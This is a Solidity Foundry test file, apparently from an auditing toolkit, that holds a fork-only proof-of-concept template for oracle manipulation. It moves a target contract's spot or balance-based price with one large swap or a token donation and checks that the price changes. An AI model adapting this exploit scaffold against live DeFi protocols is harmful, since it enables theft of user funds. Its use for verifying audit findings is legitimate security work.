// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Oracle manipulation (spot price + balance-as-price)
/// @notice Detectors: oracle-spot, balance-as-price. The target prices off
///         a SPOT value (DEX reserves / its own token balance) instead of
///         a TWAP / Chainlink feed. One big swap -- or a plain donation --
///         moves the price, and the target lends / settles / mints at the
///         manipulated price.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set ROUTER / TOKEN / TARGET price
///      view / the price-sensitive function to the real ones.

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: DEX router, tokens, and the target's price view.
    address public constant ROUTER = address(0);
    address public constant TOKEN_IN = address(0);
    address public constant TOKEN_OUT = address(0);
    address public constant WHALE = address(0); // holds TOKEN_IN on this fork

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _readPrice() internal view returns (uint256) {
        // TODO: adapt to the target's real price view (getPrice / price /
        // getReserves-derived / exchangeRate).
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("getPrice()"));
        require(ok, "target has no getPrice() view -- adapt the price read");
        return abi.decode(ret, (uint256));
    }

    function test_spotPriceMovedByOneSwap() public {
        require(ROUTER != address(0) && WHALE != address(0), "set ROUTER / tokens / WHALE");
        address attackerEOA = makeAddr("attacker");

        vm.prank(WHALE);
        IERC20(TOKEN_IN).transfer(attackerEOA, 1000 ether);
        vm.prank(attackerEOA);
        IERC20(TOKEN_IN).approve(ROUTER, 1000 ether);

        uint256 priceBefore = _readPrice();
        address[] memory path = new address[](2);
        path[0] = TOKEN_IN;
        path[1] = TOKEN_OUT;
        vm.prank(attackerEOA);
        IRouter(ROUTER).swapExactTokensForTokens(1000 ether, 0, path, attackerEOA, block.timestamp + 300);
        uint256 priceAfter = _readPrice();

        console.log("price before swap:", priceBefore);
        console.log("price after swap:", priceAfter);
        assertTrue(priceAfter != priceBefore, "exploit did not reproduce: one swap did not move the price");
    }

    function test_balanceAsPriceMovedByDonation() public {
        require(TOKEN_OUT != address(0) && WHALE != address(0), "set TOKEN_OUT / WHALE");
        address attackerEOA = makeAddr("attacker");

        vm.prank(WHALE);
        IERC20(TOKEN_OUT).transfer(attackerEOA, 1000 ether);

        uint256 priceBefore = _readPrice();
        vm.prank(attackerEOA);
        IERC20(TOKEN_OUT).transfer(target, 1000 ether);
        uint256 priceAfter = _readPrice();

        console.log("price before donation:", priceBefore);
        console.log("price after donation:", priceAfter);
        assertTrue(priceAfter != priceBefore, "exploit did not reproduce: donation did not move the price");
    }
}
